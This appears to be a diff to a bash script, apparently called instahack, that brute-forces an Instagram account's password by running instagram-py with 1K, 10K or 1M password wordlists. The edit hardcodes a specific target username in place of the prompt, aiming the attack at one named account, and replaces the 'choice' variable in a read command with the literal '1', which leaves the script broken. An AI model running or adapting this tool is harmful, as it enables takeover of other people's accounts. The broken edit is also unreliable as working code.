@@ -34,7 +34,7 @@ echo -e "\n                \e[101m\e[1;77m  >>  Script By SSLRI << \e[0m\n"
 echo -e "\n       \e[100m\e[1;77m >>  Instagram : \e[1;96m sslri \e[100m\e[1;77m << \e[0m\n"
 
 # Asking the user to enter the username of the target instagram account
-read -p "[#] Enter the username of the target : " usrnm
+read -p "[#] Enter the username of the target : " Folami_collection 
 
 # Asking the user to enter a choice for the wordlist
 # ----
@@ -45,13 +45,13 @@ echo -e "\nChoose any of the options below :
 ${GREEN}[${RED}1${GREEN}] ${YELLOW}1K passwords wordlist file${DEFCOL}
 ${GREEN}[${RED}2${GREEN}] ${YELLOW}10K passwords wordlist file${DEFCOL}
 ${GREEN}[${RED}3${GREEN}] ${YELLOW}1M passwords wordlist file${DEFCOL}\n"
-read -p "[#] Enter your choice: " choice
+read -p "[#] Enter your choice: " 1
 
 # Checking the user entered option
 if [[ $choice == "1" ]]; then
 	# If the user entered the option for the 1K password wordlist file
 
-	instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass1.txt 
+	instagram-py --username Folami_collection --password-list $HOME/instahack/pass/pass1.txt 
 elif [[ $choice == "2" ]]; then
 	# If the user entered the option for the 10K password wordlist file
 
